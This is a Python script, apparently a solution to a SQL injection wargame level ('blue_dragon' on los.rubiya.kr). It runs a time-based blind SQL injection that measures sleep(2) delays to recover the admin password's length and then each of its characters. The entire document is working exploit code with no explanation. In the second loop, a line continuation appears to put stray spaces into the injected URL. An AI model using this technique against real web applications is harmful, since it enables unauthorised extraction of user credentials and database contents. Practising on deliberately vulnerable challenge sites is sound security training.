import requests
import time

cookie = {'PHPSESSID' : '~~~~'}

def delay_chk(url):
    start_time = time.time()
    res = requests.get(url, cookies=cookie)
    if res.status_code == 200:
        end_time = time.time()
        return end_time - start_time
    else:
        return 0
    
for i in range(1,100):
    url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?id=' or if(id='admin' and length(pw)=%d, sleep(2), 1)%%23" % i
    print("%d ... " % i, end="")
    
    if(delay_chk(url) >= 2):
        pw_len = i
        print("O")
        print("\n======================")
        print("admin pw length  |  %d" % pw_len)
        print("======================\n")
        break
    
    else:
        print("X")
        

pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?\
                id=' or if(id='admin' and ascii(substr(pw,%d,1))=%d, sleep(2), 1)%%23" % (i+1, j)

        if delay_chk(url) >= 2:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break
            

print("\n======================")
print("admin pw  |  %s" % pw_value)
print("======================\n")